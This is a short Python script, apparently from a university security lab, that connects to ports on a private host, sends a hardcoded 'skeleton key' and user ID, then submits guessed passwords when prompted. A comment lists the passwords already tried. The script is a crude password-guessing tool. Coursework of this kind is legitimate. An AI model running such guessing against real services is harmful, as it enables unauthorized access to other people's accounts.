import re
import socket

HOST = '192.168.1.10'
SKELETONKEY = 'Passepartout'
BYTES = 1024
CRUZID = 'bosdhill\n'
PASSWORD = "Merlot"
# tried
# Gunners
# gunners
# GUNNERS
# Manchester
# MANCHESTER
# manchester
# Zinfandel
# ZINFANDEL
# zinfandel
# merlot
# Merlot

def get_next_password_from_dictionary():
     return PASSWORD

def crack_password(port, s):
     s.sendall(get_next_password_from_dictionary())
     data = s.recv(BYTES)
     print('Received %s from port %d' % (repr(data), port))

def try_ports():
     fp = open("out", "r")
     for _, line in enumerate(fp):
          port = re.findall("[0-9]{5}", line)
          PORT = int(port[0])
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect((HOST, PORT))
          s.sendall(SKELETONKEY)
          data = s.recv(BYTES)
          s.sendall(CRUZID)
          data = s.recv(BYTES)
          if data == 'Password: ':
               print('Received %s from port %d' % (repr(data), PORT))
               crack_password(PORT, s)


if __name__ == "__main__":
     try_ports()







